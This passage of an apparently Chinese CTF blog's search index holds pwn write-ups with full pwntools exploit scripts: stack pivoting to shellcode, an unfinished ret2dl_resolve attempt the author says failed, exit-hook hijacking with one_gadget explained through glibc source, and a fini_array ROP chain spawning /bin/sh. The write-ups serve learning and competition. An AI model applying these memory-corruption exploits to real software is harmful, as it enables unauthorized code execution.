最后我们就能得到flag啦~ 1moectf{c1rn0_1s_tH3_5tr0n9est!}","link":"/2020/11/18/moectf2020%20write%20up%20for%20%E2%91%A8%E7%9A%84%E5%AE%8C%E7%BE%8E%E7%AE%97%E6%9C%AF%E6%95%99%E5%AE%A4/"},{"title":"utctf2021 write up for 2Smol","text":"又是一道栈迁移… 惯例的checksec，保护全关，整挺好 拖入IDA进行分析 直接就有一个很大的溢出可以利用 由于程序本身没有调用libc库，故考虑栈迁移 + ret2shellcode以get shell 构造exp如下： 123456from pwn import *context.arch = 'amd64'p = process('./smol') # p = remote('pwn.utctf.live', 9998)p.send(b'A' * 8 + p64(0x402008 + 0x500) + p64(0x401015))p.send(p64(0x402020 + 0x500) * 4 + asm(shellcraft.sh()))p.interactive() 运行即可get shell","link":"/2021/03/18/utctf2021%20write%20up%20for%202Smol/"},{"title":"utctf2021 write up for resolve","text":"ret2dl_resolve ，但是不会做… 首先自然是先 checksec，只开了一个 NX： 惯例拖进 IDA，主函数比较简单，就是一个平平无奇的 gets() ： 1234567int __cdecl main(int argc, const char **argv, const char **envp){ char v4[8]; // [rsp+8h] [rbp-8h] BYREF gets(v4, argv, envp); return 0;} 简单写了一版 exp 雏形，好像没打通，后面有时间再改了… 1234567891011121314151617181920212223from pwn import *p = process('./resolve') # p = remote('pwn.utctf.live', 5432)offset = 0x8bss = 0x404030pop_rdi_ret = 0x4011C3main_addr = 0x401136gets_plt = 0x401040payload1 = b'A' * offset + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(bss + 0x200) + p64(gets_plt) + p64(main_addr)p.sendline(payload1)p.sendline(b&quot;/bin/sh&quot;)payload2 = b'A' * offset + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(bss + 0x100) + p64(gets_plt) + p64(main_addr)p.sendline(payload2)p.sendline(b&quot;system&quot;)payload3 = b'A' * offset + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(0x400408) + p64(gets_plt) + p64(pop_rdi_ret) + p64(bss + 0x200) + p64(gets_plt)p.sendline(p32(bss + 0x100 - 0x400420) + b&quot;\\x12&quot;)p.interactive()","link":"/2021/03/18/utctf2021%20write%20up%20for%20resolve/"},{"title":"浅谈exit函数的利用方式之一——exit hook","text":"众所周知（雾），一个Linux程序的执行流程应当如下图所示… 0x00.exit hook浅析start with some basis…虽然在我们初学编程时老师都会说一个程序的入口点是main函数，但实际上main函数只是用户代码的入口点，在Linux下一个程序真正的入口点是_start()函数 在该函数中会调用__libc_start_main()函数，这个函数会调用__libc_csu_init()函数进行一系列的初始化工作，之后才会调用main函数，来到用户代码空间 同样的，无论用户代码中是否调用exit()函数，在用户代码结束后程序都会缺省调用exit函数 something about __libc_start_main()…考虑如下代码： 1234567891011121314151617181920212223/* Note: the fini parameter is ignored here for shared library. Itis registered with __cxa_atexit. This had the disadvantage thatfinalizers were called in more than one place. */STATIC intLIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL), int argc, char **argv,#ifdef LIBC_START_MAIN_AUXVEC_ARG ElfW(auxv_t) *auxvec,#endif __typeof (main) init, void (*fini) (void), void (*rtld_fini) (void), void *stack_end){/* Result of the 'main' function. */int result;...#else/* Nothing fancy, just call the function. */result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);#endifexit (result);} 该段代码为__libc_start_main()函数的部分代码，该函数定义于csu/libc-start.c中 我们不难从中看出，当一个程序结束的时候，都会缺省调用exit()函数 what is exit() ?exit()函数定义于stdlib/exit.c中，如下： 123456voidexit (int status){__run_exit_handlers (status, &amp;__exit_funcs, true, true);}libc_hidden_def (exit) 依旧是libc中常见的套娃函数，其调用了__run_exit_handlers()函数，我们继续对齐跟进 该函数同样定义于stdlib/exit.c中，如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798voidattribute_hidden__run_exit_handlers (int status, struct exit_function_list **listp, bool run_list_atexit, bool run_dtors){/* First, call the TLS destructors. */#ifndef SHAREDif (&amp;__call_tls_dtors != NULL)#endifif (run_dtors)__call_tls_dtors ();/* We do it this way to handle recursive calls to exit () made bythe functions registered with `atexit' and `on_exit'. We calleveryone on the list and use the status value in the lastexit (). */while (true){struct exit_function_list *cur;__libc_lock_lock (__exit_funcs_lock);restart:cur = *listp;if (cur == NULL) { /* Exit processing complete. We will not allow any more atexit/on_exit registrations. */ __exit_funcs_done = true; __libc_lock_unlock (__exit_funcs_lock); break; }while (cur-&gt;idx &gt; 0) { struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx]; const uint64_t new_exitfn_called = __new_exitfn_called; /* Unlock the list while we call a foreign function. */ __libc_lock_unlock (__exit_funcs_lock); switch (f-&gt;flavor) { void (*atfct) (void); void (*onfct) (int status, void *arg); void (*cxafct) (void *arg, int status); case ef_free: case ef_us: break; case ef_on: onfct = f-&gt;func.on.fn;#ifdef PTR_DEMANGLE PTR_DEMANGLE (onfct);#endif onfct (status, f-&gt;func.on.arg); break; case ef_at: atfct = f-&gt;func.at;#ifdef PTR_DEMANGLE PTR_DEMANGLE (atfct);#endif atfct (); break; case ef_cxa: /* To avoid dlclose/exit race calling cxafct twice (BZ 22180), we must mark this function as ef_free. */ f-&gt;flavor = ef_free; cxafct = f-&gt;func.cxa.fn;#ifdef PTR_DEMANGLE PTR_DEMANGLE (cxafct);#endif cxafct (f-&gt;func.cxa.arg, status); break; } /* Re-lock again before looking at global state. */ __libc_lock_lock (__exit_funcs_lock); if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called)) /* The last exit function, or another thread, has registered more exit functions. Start the loop over. */ goto restart; }*listp = cur-&gt;next;if (*listp != NULL) /* Don't free the last element in the chain, this is the statically allocate element. */ free (cur);__libc_lock_unlock (__exit_funcs_lock);}if (run_list_atexit)RUN_HOOK (__libc_atexit, ());_exit (status);} 该函数经过一系列的处理之后最终会调用_exit()函数，通过系统调用exit结束进程的生命 pwn! the exit hook观察到于该函数中有三个函数指针：atfct、onfct、cxafct，分别会根据listp（上层函数传参静态指针__exit_funcs，指向exit_function_list类型结构体静态变量initial，exit_function_list结构体中有着32个exit_function结构体变量，该类型结构体使用联合体的方式储存三种函数指针，进程中的所有exit_function_list链接成一单向链表）中不同的exit_function的flavor的不同值调用不同的函数指针 使用gdb进行动态调试，我们可以发现其调用的其中一个函数为_dl_fini() 该函数定义于elf/dl-fini.c中，我们主要关注如下部分代码： 12345678910void_dl_fini (void){...for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns){/* Protect against concurrent loads and unloads. */__rtld_lock_lock_recursive (GL(dl_load_lock));... __rtld_lock_unlock_recursive (GL(dl_load_lock)); 在这里用到了两个宏__rtld_lock_lock_recursive和__rtld_lock_unlock_recursive，其定义于sysdeps/nptl/libc-lockP.h中，如下： 1234567#ifdef SHARED...# define __rtld_lock_lock_recursive(NAME) \\GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)# define __rtld_lock_unlock_recursive(NAME) \\GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex) 这里用到了一个宏GL()，该宏定义于sysdeps/generic/ldsodefs.h中，如下： 12345678910111213#ifndef SHARED# define EXTERN extern# define GL(name) _##name#else# define EXTERN# if IS_IN (rtld)# define GL(name) _rtld_local._##name# else# define GL(name) _rtld_global._##name# endifstruct rtld_global{#endif 在define SHARED之后有两个分支：_rtld_local与_rtld_global，这里我们暂且不深究细节，使用gdb进行调试我们可以发现对于主线程而言_rtld_local就是_rtld_global 最终我们进行宏展开可得如下结果： 12_rtld_global._dl_rtld_lock_recursive(&amp;(_rtld_global._dl_load_lock).mutex)_rtld_global._dl_rtld_unlock_recursive(&amp;(_rtld_global._dl_load_lock).mutex) 即在这里会调用_rtld_global结构体中的两个函数指针_dl_rtld_lock_recursive与_dl_rtld_unlock_recursive，这就是我们所常说的exit hook 使用gdb调试我们可以计算出其相对于libc基址的偏移，这里便不再赘叙 something more…需要注意的是在glibc2.31及以后的版本中exit函数不会再调用_dl_fini函数，对于exit hook的利用失效 注意到exit()函数中还调用了 _IO_flush_all_lockp ()函数，这为我们提供了另一种利用exit函数get shell的解法——FSOP，笔者将在后面的博客中进行解析~ 0x01.实战： ciscn_2019_n_7 - exit_hook hijact + one_gadget惯例的checksec，保 护 全 开（噔 噔 咚 拖入IDA进行分析，可知该程序有着分配、编辑、打印堆块的功能 但是我们仅能够分配一个堆块，且无法释放堆块 漏洞点在于创建/编辑堆块时输入作者姓名时存在溢出，可以覆写掉与其相邻的堆块指针，在接下来的编辑中我们便可以实现任意地址写 同时，输入666则可直接泄露libc地址 解法：劫持exit_hook前面我们讲到，由于程序退出时必定会调用exit()函数，故考虑劫持exit_hook为one_gadget后退出程序即可get shell 需要注意的一点是在计算_rtld_global的相对偏移时，由于libc中同名函数的存在，导致ELF.sym不可用，此处需要我们手动调试算出相对偏移（似乎这个结构体不在libc而在ld中，等笔者有时间再进一步研究） libc2.23下偏移为0x5f0040，两个hook的偏移为3848和3850 构造exp如下： 123456789101112131415161718192021222324from pwn import *#context.log_level = 'DEBUG'p = process('./ciscn_2019_n_7')#remote('node3.buuoj.cn', 26348)libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')#ELF('./libc-2.23.so')one_gadget = 0xf1147p.recv()p.sendline(b'666')puts_addr = int((p.recvuntil(b'\\n', drop = True)), 16)libc_base = puts_addr - libc.sym['puts']log.info('libc leak: ' + str(hex(libc_base)))p.recvuntil(b&quot;Your choice-&gt; &quot;)p.sendline(b'1')p.recvuntil(b&quot;Input string Length: &quot;)p.sendline(str(0x100).encode())p.recvuntil(b&quot;Author name:&quot;)p.send(b'AAAAAAAA' + p64(libc_base + 0x5f0040+3848))p.recvuntil(b&quot;Your choice-&gt; &quot;)p.sendline(b'2')p.recvuntil(b&quot;New Author name:&quot;)p.send(b'AAAAAAAA')p.recvuntil(b&quot;New contents:&quot;)p.send(p64(libc_base + one_gadget)*2)p.sendline('5')p.interactive() 运行即可get shell~","link":"/2021/01/21/%E6%B5%85%E8%B0%88exit%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E4%B9%8B%E4%B8%80exit%20hook/"},{"title":"浅谈exit函数的利用方式之二——fini_array","text":"只有静态编译才会用到的神必数组fini_array… 0x00.fini_array浅析重新将目光转回exit()函数，这一次我们需要关注的是这一块： 前面有我们已经讲到过，main函数返回之后便会执行__libc_csu_fini()函数，我们将一个程序编译后再反汇编便可以发现： 动态编译时该函数为空函数 静态编译下该函数会逐一取出一个数组中的函数指针执行，该函数指针数组位于bss段上 那么我们不难想到：若是能够控制该数组中的函数指针，便能够在程序exit()后控制程序执行流 0x01.实战：pwnable.tw - 3x17惯例的checksec，只开了NX 拖入IDA进行分析，静态编译 + 符号表扣光（悲 不过通过_start()函数的结构我们还是能够获取如下信息： 那么这个函数应当为main函数 其功能为往指定地址写最大0x18字节的数据，但是只能写一次 由于程序是静态编译的，故考虑劫持fini_array数组控制程序执行流以get shell 一开始只能读一次，那么考虑劫持fini_array[1]为main、fini_array[0]为__libc_csu_fini()以反复读入 我们同时还需要考虑进行栈迁移，观察libc_csu_fini的反汇编代码，我们可以发现rbp的值便是fini_array，故我们可以将栈劫持到fini_array附近，在这里构造我们的rop链 在fini_array上布置如下rop链以进行栈迁移： 12345678910111213141516 ------------------------ | |rbp-&gt; | leave; ret | &lt;- fini_array[0] | | ------------------------ | | | ret | &lt;- fini_array[1] // need to be useless | | ------------------------ | | | (real rop start) | &lt;- fini_array[2] | | ------------------------ | | | ... | &lt;- fini_array[3] | | 最终构造exp如下： 12345678910111213141516171819202122232425262728293031323334from pwn import *context.arch = 'amd64'#context.log_level = 'debug'p = remote('chall.pwnable.tw', 10105)e = ELF('./3x17')main = 0x401B6Dcsu_fini = 0x402960fini_array = 0x4B40F0pop_rax_ret = e.search(asm('pop rax ; ret')).__next__()pop_rdi_ret = e.search(asm('pop rdi ; ret')).__next__()pop_rsi_ret = e.search(asm('pop rsi ; ret')).__next__()pop_rdx_ret = e.search(asm('pop rdx ; ret')).__next__()syscall = e.search(asm('syscall')).__next__()leave_ret = e.search(asm('leave ; ret')).__next__()ret = e.search(asm('ret')).__next__()def write(addr:int, data): p.recvuntil(b&quot;addr:&quot;) p.sendline(str(addr)) p.recvuntil(b&quot;data:&quot;) p.send(data) write(fini_array, p64(csu_fini) + p64(main))write(fini_array + 0x10, p64(pop_rax_ret) + p64(59)) # execvewrite(fini_array + 0x20, p64(pop_rdi_ret) + p64(fini_array + 0x60))write(fini_array + 0x30, p64(pop_rsi_ret) + p64(0))write(fini_array + 0x40, p64(pop_rdx_ret) + p64(0))write(fini_array + 0x50, p64(syscall))write(fini_array + 0x60, b&quot;/bin/sh\\x00&quot;)#gdb.attach(p)write(fini_array, p64(leave_ret) + p64(ret))p.interactive() 运行即可get shell","link":"/2021/03/10/%E6%B5%85%E8%B0%88exit%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E4%B9%8B%E4%BA%8C%E2%80%94%E2%80%94fini_array/"}],"tags":[{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"C&#x2F;C++","slug":"C-C","link":"/tags/C-C/"},{"name":"链表","slug":"链表","link":"/tags/%E9%93%BE%E8%A1%A8/"},{"name":"快慢指针","slug":"快慢指针","link":"/tags/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88/"},{"name":"栈","slug":"栈","link":"/tags/%E6%A0%88/"},{"name":"并查集","slug":"并查集","link":"/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"树","slug":"树","link":"/tags/%E6%A0%91/"},{"name":"动态规划","slug":"动态规划","link":"/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"DFS","slug":"DFS","link":"/tags/DFS/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Pwn","slug":"Pwn","link":"/tags/Pwn/"},{"name":"信息安全","slug":"信息安全","link":"/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"堆","slug":"堆","link":"/tags/%E5%A0%86/"},{"name":"minilctf","slug":"minilctf","link":"/tags/minilctf/"},{"name":"Reverse","slug":"Reverse","link":"/tags/Reverse/"},{"name":"moectf","slug":"moectf","link":"/tags/moectf/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"ret2csu","slug":"ret2csu","link":"/tags/ret2csu/"},{"name":"ret2libc","slug":"ret2libc","link":"/tags/ret2libc/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"canary","slug":"canary","link":"/tags/canary/"},{"name":"栈迁移","slug":"栈迁移","link":"/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"ret2shellcode","slug":"ret2shellcode","link":"/tags/ret2shellcode/"},{"name":"ret2sdl_resolve","slug":"ret2sdl-resolve","link":"/tags/ret2sdl-resolve/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"软件开发","slug":"软件开发","link":"/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"},{"name":"OnlineJudge","slug":"OnlineJudge","link":"/categories/OnlineJudge/"}]}